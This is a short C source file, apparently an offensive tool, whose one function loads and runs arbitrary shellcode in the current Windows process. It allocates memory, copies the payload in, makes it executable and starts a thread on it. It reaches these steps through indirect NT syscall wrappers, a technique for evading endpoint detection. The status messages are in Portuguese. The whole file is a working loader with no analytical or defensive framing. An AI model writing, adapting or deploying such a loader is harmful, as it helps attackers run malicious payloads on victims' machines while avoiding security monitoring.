#include "syscalls.h"
#include <stdio.h>

void ExecuteShellcodeAdvanced(PBYTE shellcode, SIZE_T size) {
    HANDLE hProcess = GetCurrentProcess();
    PVOID baseAddr = NULL;
    SIZE_T regionSize = size;

    NTSTATUS status = NtAllocateVirtualMemory_Indirect(hProcess, &baseAddr, 0, &regionSize,
                                                       MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (!NT_SUCCESS(status)) {
        printf("[-] Falha na alocação de memória\n");
        return;
    }

    memcpy(baseAddr, shellcode, size);

    ULONG oldProtect;
    NtProtectVirtualMemory_Indirect(hProcess, &baseAddr, &regionSize, PAGE_EXECUTE_READ, &oldProtect);

    HANDLE hThread = NULL;
    NtCreateThreadEx_Indirect(&hThread, THREAD_ALL_ACCESS, NULL, hProcess,
                              baseAddr, NULL, FALSE, 0, 0, 0, NULL);

    if (hThread) {
        printf("[+] Shellcode injetado e executado via indirect syscalls!\n");
        WaitForSingleObject(hThread, 8000);
    }
}
